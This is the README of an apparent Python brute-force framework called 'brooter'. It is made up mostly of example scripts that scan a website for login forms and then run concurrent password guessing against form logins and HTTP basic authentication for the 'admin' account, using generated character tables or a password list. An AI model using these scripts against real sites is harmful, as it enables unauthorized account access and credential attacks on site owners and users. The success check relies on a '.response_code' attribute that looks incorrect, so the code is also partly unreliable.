# brooter
Easy and extensible brute force algorithms and utilities framework for Python

Please use responsibly. I, do not take responsibility for misuse or damages.
This software comes with no warranty. Don't do evil stuff.

Planned features:
+ Distributed processing

Do a scan for all forms on a webpage
```python
from br00ter import reverser

forms = reverser.scan_forms('http://vulnerable.website')
```
Construct a login request using information gathered from scanning the forms
```python
form = forms[0]
data = form.generate_data('admin', 'password_here')
```
...and POST the data to check the password
```python
import requests

requests.post('http://vulnerable.website', data=data)
```

Putting it together:
Automatically scan a webpage for forms and brute-force without any reverse-engineering required:
```python
import br00ter, requests
from br00ter import reverser

def test_login(combo): # Post to 'url' automatically generated form data and check for an OK response
    print('testing ' + combo)
    success = requests.post(url, data=form.generate_data(username, combo)).response_code == 200
    print(combo + str(success))
    return (combo, success)

if __name__ == '__main__':
    username = 'admin'
    url = 'http://vulnerable.website'
    form = reverser.scan_forms(url)[0]

    with br00ter.TableGenerator('abc', 3, 5) as x:
        print('Launching...')
        pool = br00ter.BrutePool(x, test_login)
        pool.start()
        pool.join()
```

Concurrent example for basic HTTP authentication:
```python
import br00ter, requests
from br00ter import targets

username = 'admin'

if __name__ == '__main__':
    sess = targets.BasicAuthTarget('http://vulnerable.website', requests.session(), username)
    with br00ter.FileGenerator('passlist.txt') as x:
        print('Launching...')
        pool = br00ter.BrutePool(x, sess.test)
        pool.start()
        pool.join()
```

